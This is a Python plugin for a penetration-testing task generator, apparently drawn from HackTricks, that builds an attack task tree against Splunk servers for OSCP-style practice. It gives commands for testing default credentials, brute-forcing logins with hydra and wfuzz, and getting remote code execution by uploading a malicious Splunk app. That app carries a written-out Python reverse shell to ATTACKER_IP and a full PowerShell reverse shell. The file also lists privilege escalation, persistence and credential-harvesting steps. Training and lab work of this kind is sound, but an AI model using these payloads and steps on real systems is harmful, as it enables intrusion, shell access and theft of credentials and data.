"""
Splunk/Splunkd service enumeration and exploitation plugin

Generates tasks for Splunk log analytics platform including:
- Default credential testing
- Free version (no auth) exploitation
- Remote code execution via custom applications
- Scripted inputs abuse (Python/PowerShell/Bash)
- Privilege escalation vectors

Extracted from HackTricks: network-services-pentesting/8089-splunkd.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class SplunkPlugin(ServicePlugin):
    """Splunk/Splunkd log analytics platform enumeration plugin"""

    @property
    def name(self) -> str:
        return "splunk"

    @property
    def default_ports(self) -> List[int]:
        return [8000, 8089]

    @property
    def service_names(self) -> List[str]:
        return ['splunk', 'splunkd', 'http', 'https']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect Splunk services"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        port = port_info.get('port')

        # Check service/product name
        if 'splunk' in service or 'splunk' in product:
            return True

        # Check common ports
        if port in [8000, 8089]:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Splunk enumeration task tree"""

        tasks = {
            'id': f'splunk-enum-{port}',
            'name': f'Splunk Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Task 1: Service Identification
        tasks['children'].append({
            'id': f'splunk-identify-{port}',
            'name': 'Identify Splunk Service',
            'type': 'command',
            'metadata': {
                'command': f'curl -s http://{target}:{port}/ | grep -i splunk',
                'description': 'Confirm Splunk service and identify version',
                'flag_explanations': {
                    '-s': 'Silent mode (no progress bar)',
                    'grep -i': 'Case-insensitive search for "splunk"',
                    '| (pipe)': 'Pass curl output to grep'
                },
                'success_indicators': [
                    'Splunk login page detected',
                    'Splunk version banner visible',
                    'Splunk build information in HTML',
                    'Splunk branding/logo present'
                ],
                'failure_indicators': [
                    'Connection refused',
                    'No Splunk references found',
                    'HTTP 404',
                    'Different web application'
                ],
                'next_steps': [
                    'Note exact Splunk version and build',
                    'Check if free version (no auth)',
                    'Test default credentials',
                    'Research version-specific CVEs'
                ],
                'alternatives': [
                    f'Manual: Browse to http://{target}:{port}',
                    f'nmap -sV -p {port} {target}',
                    f'whatweb http://{target}:{port}',
                    f'curl -I http://{target}:{port} (check HTTP headers)'
                ],
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'estimated_time': '1 minute',
                'notes': '''Splunk ports:
- 8000: Web UI (primary target)
- 8089: Splunkd management API

Check for "Splunk Free" - trial converts to free after 60 days (NO AUTHENTICATION).'''
            }
        })

        # Task 2: Free Version Check
        tasks['children'].append({
            'id': f'splunk-free-check-{port}',
            'name': 'Test for Free Version (No Auth)',
            'type': 'command',
            'metadata': {
                'command': f'curl -s http://{target}:{port}/en-US/splunkd/__raw/services/server/info | grep -i "licenseState\\|product_type"',
                'description': 'Check if Splunk is running in free version (lacks authentication)',
                'flag_explanations': {
                    '/en-US/splunkd/__raw/services/server/info': 'Splunk server info API endpoint',
                    'licenseState': 'Shows license status (FREE, TRIAL, ENTERPRISE)',
                    'product_type': 'Splunk edition (free, enterprise, etc.)'
                },
                'success_indicators': [
                    'licenseState: FREE or TRIAL',
                    'product_type: splunk_free',
                    'No authentication required for API access',
                    'Server info returned without login'
                ],
                'failure_indicators': [
                    'HTTP 401 Unauthorized',
                    'Redirect to login page',
                    'licenseState: ENTERPRISE (authentication enforced)',
                    'Connection refused'
                ],
                'next_steps': [
                    'If FREE: Direct access possible (no auth)',
                    'If TRIAL: May lack auth (check manually)',
                    'If ENTERPRISE: Proceed to credential testing',
                    'Research known free version exploits'
                ],
                'alternatives': [
                    f'Manual: Browse http://{target}:{port} - if no login prompt, it\'s free',
                    f'curl -s http://{target}:{port}/services/server/info (direct API)',
                    'Check for automatic redirect to /account/login vs direct content access'
                ],
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'estimated_time': '2 minutes',
                'notes': '''CRITICAL VULNERABILITY: Splunk Free Version
- Trial automatically converts to free after 60 days
- Free version has NO AUTHENTICATION
- Administrators often overlook this security gap
- Direct API access and RCE possible without credentials

This is HIGH-VALUE target for OSCP exam.'''
            }
        })

        # Task 3: Default Credentials Test
        tasks['children'].append({
            'id': f'splunk-default-creds-{port}',
            'name': 'Test Default Credentials',
            'type': 'command',
            'metadata': {
                'command': f'curl -u admin:changeme -s http://{target}:{port}/services/server/info',
                'description': 'Test default Splunk credentials (older versions)',
                'flag_explanations': {
                    '-u admin:changeme': 'HTTP Basic Auth with default credentials',
                    '/services/server/info': 'API endpoint requiring authentication'
                },
                'success_indicators': [
                    'HTTP 200 response',
                    'XML/JSON server info returned',
                    'Authentication successful',
                    'No redirect to login page'
                ],
                'failure_indicators': [
                    'HTTP 401 Unauthorized',
                    'Invalid credentials message',
                    'Redirect to login page',
                    'Account lockout'
                ],
                'next_steps': [
                    'If successful: Access Splunk UI and API',
                    'If failed: Try common weak passwords',
                    'Proceed to brute-force attack',
                    'Check for custom application upload capability'
                ],
                'alternatives': [
                    f'Manual: Login at http://{target}:{port} with admin:changeme',
                    'Common passwords: admin:admin, admin:Password123, admin:Welcome1',
                    f'curl -u admin:admin http://{target}:{port}/services/server/info',
                    f'curl -u admin:Password123 http://{target}:{port}/services/server/info'
                ],
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'estimated_time': '2-3 minutes',
                'notes': '''Default credentials timeline:
- Older versions: admin:changeme (pre-configured)
- Newer versions: Set during installation
- Common weak passwords: admin, Welcome, Password123, Splunk123

Try these common patterns:
- admin:admin
- admin:changeme
- admin:Welcome1
- admin:Password123
- admin:Splunk123'''
            }
        })

        # Task 4: Brute-force Authentication
        tasks['children'].append({
            'id': f'splunk-brute-{port}',
            'name': 'Brute-force Splunk Login',
            'type': 'command',
            'metadata': {
                'command': f'hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form "/en-US/account/login:username=^USER^&password=^PASS^:F=Incorrect"',
                'description': 'Brute-force Splunk authentication (use cautiously)',
                'flag_explanations': {
                    '-l admin': 'Username (admin is default)',
                    '-P': 'Password wordlist',
                    'http-post-form': 'HTTP POST form authentication',
                    '/en-US/account/login': 'Splunk login endpoint',
                    'username=^USER^&password=^PASS^': 'Form parameters',
                    ':F=Incorrect': 'Failure detection string'
                },
                'success_indicators': [
                    'Valid password found',
                    'Login successful message',
                    'Credentials displayed'
                ],
                'failure_indicators': [
                    'No valid credentials found',
                    'Account lockout triggered',
                    'Rate limiting detected',
                    'Connection throttled'
                ],
                'next_steps': [
                    'Use found credentials to access Splunk',
                    'Check user privileges and permissions',
                    'Proceed to RCE exploitation',
                    'Enumerate Splunk apps and configurations'
                ],
                'alternatives': [
                    f'Burp Intruder on login form at http://{target}:{port}/en-US/account/login',
                    f'wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "username=admin&password=FUZZ" http://{target}:{port}/en-US/account/login',
                    'Manual: Try top 10 common passwords first',
                    'Use smaller wordlist (common_passwords.txt) first'
                ],
                'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'NOISY'],
                'estimated_time': '30+ minutes (depends on wordlist)',
                'notes': '''WARNING: Brute-forcing is noisy and may trigger:
- Account lockouts
- IDS/IPS alerts
- IP bans

OSCP Strategy: Try manual common passwords FIRST before brute-force.
Common passwords (try these manually):
1. admin
2. changeme
3. Welcome1
4. Password123
5. Splunk123'''
            }
        })

        # Task 5: Remote Code Execution
        rce_task = {
            'id': f'splunk-rce-{port}',
            'name': 'Splunk Remote Code Execution',
            'type': 'parent',
            'children': []
        }

        # Method 1: Custom Application Upload
        rce_task['children'].append({
            'id': f'splunk-custom-app-rce-{port}',
            'name': 'RCE via Custom Application Upload',
            'type': 'manual',
            'metadata': {
                'description': 'Achieve RCE by uploading malicious Splunk application with scripted inputs',
                'command': '''# 1. Create malicious app structure
mkdir -p splunk_rce/bin
mkdir -p splunk_rce/default

# 2. Create reverse shell script (Linux)
cat > splunk_rce/bin/rev.py << 'EOF'
import sys, socket, os, pty
ip = "ATTACKER_IP"
port = "ATTACKER_PORT"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
EOF

# 3. Create inputs.conf (triggers script execution)
cat > splunk_rce/default/inputs.conf << 'EOF'
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell
EOF

# 4. Package app
tar -czf splunk_rce.tar.gz splunk_rce/

# 5. Set up listener
nc -lvnp ATTACKER_PORT

# 6. Upload via Splunk UI: Apps → Manage Apps → Install app from file → splunk_rce.tar.gz
# 7. App auto-executes script every 10 seconds → reverse shell
''',
                'flag_explanations': {
                    'bin/': 'Directory containing executable scripts',
                    'default/inputs.conf': 'Configuration file defining scripted inputs',
                    'disabled = 0': 'Enable the scripted input (auto-execute)',
                    'interval = 10': 'Execute script every 10 seconds',
                    '[script://./bin/rev.py]': 'Define Python script as input source',
                    'Splunk Python': 'Splunk ships with Python (works on Windows too)'
                },
                'success_indicators': [
                    'App uploaded successfully',
                    'Reverse shell connection received on listener',
                    'Command execution as Splunk user',
                    'Interactive shell obtained'
                ],
                'failure_indicators': [
                    'App upload failed (insufficient permissions)',
                    'Script execution blocked',
                    'No reverse shell connection',
                    'Python script errors in Splunk logs'
                ],
                'next_steps': [
                    'Stabilize reverse shell (python pty)',
                    'Enumerate system as Splunk user',
                    'Check for privilege escalation vectors',
                    'Exfiltrate Splunk data and credentials',
                    'Pivot to other systems'
                ],
                'alternatives': [
                    'PowerShell reverse shell for Windows targets',
                    'Bash reverse shell script',
                    'Batch file for Windows',
                    'Use REST API to deploy app (if credentials available)',
                    'Alerting scripts (similar technique)'
                ],
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'RCE', 'REQUIRES_AUTH'],
                'estimated_time': '10-15 minutes',
                'notes': '''CRITICAL RCE VECTOR - HIGH OSCP VALUE

Splunk custom apps can run arbitrary code:
- Python scripts (Splunk includes Python interpreter)
- PowerShell scripts (Windows)
- Bash scripts (Linux)
- Batch scripts (Windows)

Scripted inputs execute at defined intervals automatically.

Example repository with templates:
https://github.com/0xjpuff/reverse_shell_splunk

Windows PowerShell reverse shell (bin/run.ps1):
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()

OSCP Exam Tip: Practice creating custom apps from scratch.
No need to memorize payloads - understand the structure.'''
            }
        })

        # Method 2: REST API Deployment
        rce_task['children'].append({
            'id': f'splunk-api-rce-{port}',
            'name': 'RCE via REST API App Deployment',
            'type': 'manual',
            'metadata': {
                'description': 'Deploy malicious app via Splunk REST API (credentials required)',
                'command': f'''# Deploy app via REST API
curl -k -u USERNAME:PASSWORD \\
  -X POST \\
  -F "name=splunk_rce.tar.gz" \\
  -F "app_package=@splunk_rce.tar.gz" \\
  https://{target}:8089/services/apps/local
''',
                'flag_explanations': {
                    '-k': 'Allow insecure SSL (self-signed certificates)',
                    '-u USERNAME:PASSWORD': 'HTTP Basic Auth credentials',
                    '-X POST': 'HTTP POST method',
                    '-F': 'Form data (multipart upload)',
                    '@splunk_rce.tar.gz': 'Upload file from disk',
                    '/services/apps/local': 'Splunk API endpoint for app management'
                },
                'success_indicators': [
                    'HTTP 201 Created',
                    'App successfully installed message',
                    'App appears in Splunk UI',
                    'Scripted input executes automatically'
                ],
                'failure_indicators': [
                    'HTTP 401 - invalid credentials',
                    'HTTP 403 - insufficient permissions',
                    'App installation failed',
                    'SSL certificate error'
                ],
                'next_steps': [
                    'Wait for scripted input to execute (check interval in inputs.conf)',
                    'Catch reverse shell on listener',
                    'If no shell, check Splunk logs for errors',
                    'Try alternative payload or script'
                ],
                'alternatives': [
                    'Manual UI upload (Apps → Manage Apps → Install)',
                    'SCP app to $SPLUNK_HOME/etc/apps/ (if file access)',
                    'Use Splunk CLI: splunk install app splunk_rce.tar.gz',
                    'REST API: services/apps/local (app management)',
                    'REST API: services/data/inputs/script (scripted inputs)'
                ],
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'RCE', 'REQUIRES_AUTH'],
                'notes': '''REST API deployment advantages:
- Scriptable/automatable
- No UI interaction needed
- Can be integrated into exploit scripts

Requires:
1. Valid credentials
2. Admin or power user privileges
3. API access (port 8089)

Check API access:
curl -k -u USER:PASS https://{target}:8089/services/server/info'''
            }
        })

        tasks['children'].append(rce_task)

        # Task 6: Privilege Escalation
        tasks['children'].append({
            'id': f'splunk-privesc-{port}',
            'name': 'Splunk Privilege Escalation',
            'type': 'manual',
            'metadata': {
                'description': 'Leverage Splunk for local privilege escalation',
                'notes': '''Splunk Privilege Escalation Vectors:

1. Splunk Universal Forwarder Abuse
   - Often runs as SYSTEM/root
   - Check: ps aux | grep splunkd
   - Exploit: Deploy malicious app (same technique as RCE)

2. Scripted Inputs with High Privileges
   - Splunk scheduled searches run as privileged user
   - Abuse alerting scripts for command execution
   - Location: $SPLUNK_HOME/etc/apps/search/bin/

3. Configuration File Access
   - Credentials stored in $SPLUNK_HOME/etc/passwd
   - Hash format: <username>:<encrypted_password>
   - Decrypt with Splunk Python library

4. Log File Analysis
   - Splunk ingests logs from entire system
   - Search for credentials in logs
   - Query: index=* password OR credential OR secret

5. Persistence via Malicious App
   - Deploy app that runs on Splunk restart
   - Survives reboots
   - Configuration: inputs.conf with low interval

OSCP-Relevant Techniques:
- Search Splunk data for credentials
- Abuse Splunk as persistence mechanism
- Leverage Splunk scheduled tasks
- Extract hashed passwords from Splunk configs

Reference: HackTricks - Splunk LPE and Persistence
File: ../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md
''',
                'alternatives': [
                    'Manual: Search Splunk UI for "password" in all indexes',
                    'Check $SPLUNK_HOME/etc/passwd for password hashes',
                    'Review scheduled searches in $SPLUNK_HOME/etc/apps/*/savedsearches.conf',
                    'Enumerate Splunk forwarders (often run as root/SYSTEM)'
                ],
                'tags': ['OSCP:MEDIUM', 'PRIVESC', 'POST_EXPLOIT'],
                'estimated_time': '15-30 minutes'
            }
        })

        # Task 7: Vulnerability Research
        tasks['children'].append({
            'id': f'splunk-research-{port}',
            'name': 'Splunk Vulnerability Research',
            'type': 'parent',
            'children': [
                {
                    'id': f'splunk-searchsploit-{port}',
                    'name': 'SearchSploit: Splunk Exploits',
                    'type': 'research',
                    'metadata': {
                        'command': 'searchsploit splunk',
                        'description': 'Search exploit-db for known Splunk vulnerabilities',
                        'success_indicators': [
                            'Splunk exploits listed',
                            'CVEs identified',
                            'Exploit paths shown'
                        ],
                        'failure_indicators': [
                            'No exploits found',
                            'searchsploit not installed'
                        ],
                        'next_steps': [
                            'Review exploit requirements (versions, conditions)',
                            'Download relevant exploits',
                            'Test exploits in lab before OSCP exam',
                            'Understand exploit mechanics (don\'t just run blindly)'
                        ],
                        'alternatives': [
                            'Google: site:exploit-db.com splunk',
                            'CVE search: cve.mitre.org',
                            'GitHub: search for "splunk exploit"',
                            'Rapid7: search.vulnerabilities.rapid7.com'
                        ],
                        'tags': ['OSCP:HIGH', 'RESEARCH']
                    }
                },
                {
                    'id': f'splunk-shodan-{port}',
                    'name': 'Shodan: Exposed Splunk Instances',
                    'type': 'research',
                    'metadata': {
                        'command': 'shodan search "Splunk build"',
                        'description': 'Find publicly exposed Splunk servers on Shodan',
                        'tags': ['RESEARCH', 'OSCP:LOW'],
                        'notes': 'Shodan query: "Splunk build" - Reveals Splunk instances worldwide. Many are unsecured free versions.'
                    }
                },
                {
                    'id': f'splunk-default-paths-{port}',
                    'name': 'Splunk Default Paths & Files',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Important Splunk file locations for privilege escalation and persistence',
                        'notes': '''Splunk Directory Structure:

LINUX:
$SPLUNK_HOME = /opt/splunk or /opt/splunkforwarder
- /opt/splunk/etc/passwd (password hashes)
- /opt/splunk/etc/apps/ (installed applications)
- /opt/splunk/etc/apps/search/bin/ (alerting scripts)
- /opt/splunk/etc/system/local/ (system configurations)
- /opt/splunk/var/log/splunk/ (Splunk logs)

WINDOWS:
$SPLUNK_HOME = C:\\Program Files\\Splunk or C:\\Program Files\\SplunkUniversalForwarder
- C:\\Program Files\\Splunk\\etc\\passwd
- C:\\Program Files\\Splunk\\etc\\apps\\
- C:\\Program Files\\Splunk\\bin\\splunk.exe

Key Files:
- etc/passwd: User password hashes
- etc/apps/*/inputs.conf: Scripted inputs
- etc/apps/*/savedsearches.conf: Scheduled searches
- etc/system/local/authentication.conf: Auth settings
- etc/apps/*/bin/: Executable scripts

Privilege Escalation Checks:
1. Can you write to $SPLUNK_HOME/etc/apps/?
2. Can you modify inputs.conf?
3. Does Splunk run as root/SYSTEM?
4. Are there writable scheduled searches?
''',
                        'tags': ['OSCP:MEDIUM', 'PRIVESC', 'POST_EXPLOIT']
                    }
                }
            ]
        })

        return tasks
